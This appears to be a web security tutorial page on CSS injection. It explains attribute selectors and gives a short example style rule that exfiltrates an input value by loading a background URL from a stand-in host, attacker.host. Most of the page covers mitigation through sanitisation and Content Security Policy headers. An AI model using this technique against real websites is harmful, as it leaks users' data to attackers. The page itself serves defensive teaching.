    <h1>CSS Injection</h1>
    <p>
      CSS (Cascading Stylesheet language) is the specification for webpage
      styling supported by web browsers. The elements of a website can be styled
      using the properties set by an external stylesheet. At runtime, the page
      can introspect itself to see the styles applied. CSS has grown over time
      and became gradually complex. CSS injection happens when an attacker is
      able to place his own CSS code into a vulnerable website. This kind of
      vulnerability happens when the application permits the user-generated CSS
      or it is possible to interfere with the stylesheets in some way. The main
      impacts of CSS Injection: Cross-Site Scripting in specific conditions, UI
      modifications, and data exfiltration by taking out sensitive data. CSS
      language provides different value selectors as shown below for selecting
      the elements based on the value of an attribute
    </p>
    <p style="background-color: rgb(238, 206, 206); color: rgb(63, 122, 233)">
      <kbd>
        [attribute =value]: [username=abc]  - Selects all elements with
        username="abc" [attribute ^=value]:[username ^=abc] - Select all
        elements with username attribute value starting with "abc" [attribute
        $=value]:[username $=abc] - Select all elements with username attribute
        value ending with "abc" [attribute ~=value]:[username ~=abc] - Select
        all elements with username attribute containing the value "abc"</kbd
      >
    </p>
    <br />
    <p>
      Consider the below code snippet to understand how attackers can misuse
      these selectors.
    </p>
    <p style="background-color: rgb(238, 206, 206)">
      <kbd>
        &lt;style&gt;     #username[value="john"] {            
        background:url("https://attacker.host/john");     } &lt;/style&gt;
        <input id="username" value="john" />
      </kbd>

    <h3>CSS Injection Mitigation</h3>
    <p>
      Most modern browsers provide restrictions for different kinds of CSS
      injection that happened in the past. The CSS Injection vulnerability can
      be mitigated by following the best practice steps.
    </p>
    <ul>
      <li>
        Scan the application with a web application security scanner, which can
        easily detect this vulnerability.
      </li>
      <li>Do proper content sanitization.</li>
      <li>
        Implement proper Content Security Policy (CSP) header which can restrict
        from where stylesheets are allowed to be loaded.
      </li>
    </ul>
    <h3>Content Security Policy(CSP)</h3>
    <p>
      It can be defined as a standard to mitigate and detect numerous content
      injection attacks. It provides different directives that are used to limit
      how and from where content can be loaded into a web application. A browser
      that is compatible with CSP will execute only the scripts mentioned in the
      allowed list of domains. A website can be protected from a cross-site
      scripting attack by properly setting the Content Security Policy. To
      configure Content Security Policy, we need to set the
      "Content-Security-Policy" response header or in the "<meta />" tag of
      HTML. Set the values to control the resources that the browser is allowed
      to load for that particular page. The policy can be specified as shown
      below:
    </p>
    <kbd>Content-Security-Policy: policy </kbd>
    <p>
      The policy can be set using different directives that define the policy
      for a certain resource type. The directive “default-src” is to be set and
      it acts as a fallback for other resource types when they don't have
      policies of their own. The directives default-src or script-src is to be
      mentioned in the policy to prevent the execution of inline scripts. The
      directives default-src or style-src is to be set to restrict inline styles
      from being executed from an &lt;style&gt; element or a style attribute.
      Consider the below policy:
      <kbd>Content-Security-Policy: default-src 'self' </kbd>
    </p>
    <p>
      If the value of the "default-src" directive is set to "self" then it
      indicates that only the sources that come from the original domain are
      allowed.
      <kbd>Content-Security-Policy: script-src https://example.com/; </kbd>
    </p>
    <p>
      If the value of the "script-src" directive is set to a particular URL then
      it indicates that only the scripts from the specified sources are allowed.
      <kbd>Content-Security-Policy: style-src https://example.com/; </kbd>
    </p>
    <p>
      If the value of the "style-src" directive is set to a particular URL then
      indicates only the stylesheets from the specified sources are allowed.
      Consider the below code snippet to understand how to mitigate CSS
      Injection attacks by setting the CSP header.
    </p>
    <p style="background-color: rgb(238, 206, 206)">
      <kbd>
        &lt;head&gt;
        <br />
        &lt;meta charset="UTF-8" /&gt;
        <br />
        &lt;meta http-equiv="Content-Security-Policy" content="style-src 'self'"
        /&gt;
        <br />
        &lt;link rel="stylesheet" href="style.css" /&gt;
        <br />
        &lt;title&gt;Title Description&lt;/title&gt; <br />&lt;/head&gt;</kbd
      >
    </p>
    <p>
      Adding the above restriction as "style-src" attribute to self' indicates
      that the CSS code can be injected only if the request is from the origin
      from which the document is being served. It is recommended to set the CSP
      directives in the response header at the server configuration level as it
      handles the entire application.
